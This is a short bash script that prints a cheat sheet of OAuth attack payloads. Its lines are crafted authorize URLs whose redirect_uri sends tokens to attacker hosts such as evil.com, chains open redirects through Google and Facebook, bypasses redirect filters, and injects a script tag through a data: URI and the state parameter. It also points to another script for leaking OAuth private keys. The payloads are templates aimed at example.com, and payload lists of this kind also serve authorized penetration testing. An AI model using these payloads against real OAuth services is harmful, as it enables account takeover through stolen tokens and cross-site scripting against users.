#!/bin/bash
echo -e "[+] Payloads "
echo -e "[~] Controlled domain token hijacking payloads"
echo -e "[!] https://www.example.com/signin/authorize?[...]&redirect_uri=https://ur_own_evil_url_here.com/loginsuccessful"
echo -e "[!] https://www.example.com/signin/authorize?[...]&redirect_uri=https://ur_localhost.evil.com"
echo -e "";
echo -e "[~] Accepted Open URL token hijacking payloads"
echo -e "[!] https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com"
echo -e "https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F"
echo -e "";
echo -e "[~] Bypass a filter on redirect_uri"
echo -e "[!] https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com"
echo -e "";
echo -e "[~] Executing XSS via redirect_uri"
echo -e "[!] https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>"
echo -e "";
echo -e "[~] OAuth private key disclosure"
echo -e "[!] USE API_Finder.sh"
echo -e "";
 
